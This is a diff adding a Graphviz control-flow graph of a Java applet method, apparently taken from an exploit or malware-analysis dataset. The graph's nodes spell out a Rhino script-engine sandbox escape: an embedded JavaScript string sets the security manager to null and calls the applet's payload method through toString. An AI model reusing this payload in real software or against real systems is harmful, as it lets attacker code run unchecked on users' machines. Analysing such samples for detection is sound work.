@@ -1,0 +1,62 @@
+digraph "" {
+    "r0 := @this: Func1"
+    "staticget <java.lang.Boolean: java.lang.Boolean FALSE>"
+    "r0 := @this: Func1"->"staticget <java.lang.Boolean: java.lang.Boolean FALSE>";
+    "virtualinvoke <java.lang.Boolean: boolean booleanValue()>"
+    "staticget <java.lang.Boolean: java.lang.Boolean FALSE>"->"virtualinvoke <java.lang.Boolean: boolean booleanValue()>";
+    "new javax.script.ScriptEngineManager"
+    "virtualinvoke <java.lang.Boolean: boolean booleanValue()>"->"new javax.script.ScriptEngineManager";
+    "dup1.r"
+    "new javax.script.ScriptEngineManager"->"dup1.r";
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"
+    "dup1.r"->"specialinvoke <javax.script.ScriptEngineManager: void <init>()>";
+    "push \"js\""
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"->"push \"js\"";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"
+    "push \"js\""->"virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"->"store.r r1";
+    "load.r r1"
+    "store.r r1"->"load.r r1";
+    "push \"applet\""
+    "load.r r1"->"push \"applet\"";
+    "load.r r0"
+    "push \"applet\""->"load.r r0";
+    "interfaceinvoke <javax.script.ScriptEngine: void put(java.lang.String,java.lang.Object)> 2"
+    "load.r r0"->"interfaceinvoke <javax.script.ScriptEngine: void put(java.lang.String,java.lang.Object)> 2";
+    "ifeq load.r r0"
+    "interfaceinvoke <javax.script.ScriptEngine: void put(java.lang.String,java.lang.Object)> 2"->"ifeq load.r r0";
+    "ifeq load.r r0"->"staticget <java.lang.Boolean: java.lang.Boolean FALSE>";
+    "staticget <java.lang.Boolean: java.lang.Boolean FALSE>"->"virtualinvoke <java.lang.Boolean: boolean booleanValue()>";
+    "pop"
+    "virtualinvoke <java.lang.Boolean: boolean booleanValue()>"->"pop";
+    "pop"->"load.r r0";
+    "new javax.swing.JList"
+    "load.r r0"->"new javax.swing.JList";
+    "new javax.swing.JList"->"dup1.r";
+    "push 1"
+    "dup1.r"->"push 1";
+    "newarray"
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "push 0"->"load.r r1";
+    "push \"function toString(){Packages.java.lang.System.setSecurityManager(null); applet.kan();return \'WRONG!\'};function scltk(){var mierror = new Error(); mierror.message = this; return mierror;}; scltk();\""
+    "load.r r1"->"push \"function toString(){Packages.java.lang.System.setSecurityManager(null); applet.kan();return \'WRONG!\'};function scltk(){var mierror = new Error(); mierror.message = this; return mierror;}; scltk();\"";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1"
+    "push \"function toString(){Packages.java.lang.System.setSecurityManager(null); applet.kan();return \'WRONG!\'};function scltk(){var mierror = new Error(); mierror.message = this; return mierror;}; scltk();\""->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1";
+    "arraywrite.r"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)> 1"->"arraywrite.r";
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"
+    "arraywrite.r"->"specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>";
+    "virtualinvoke <Func1: java.awt.Component add(java.awt.Component)>"
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"->"virtualinvoke <Func1: java.awt.Component add(java.awt.Component)>";
+    "virtualinvoke <Func1: java.awt.Component add(java.awt.Component)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <javax.script.ScriptException: void printStackTrace()>"
+    "virtualinvoke <Func1: java.awt.Component add(java.awt.Component)>"->"virtualinvoke <javax.script.ScriptException: void printStackTrace()>";
+}
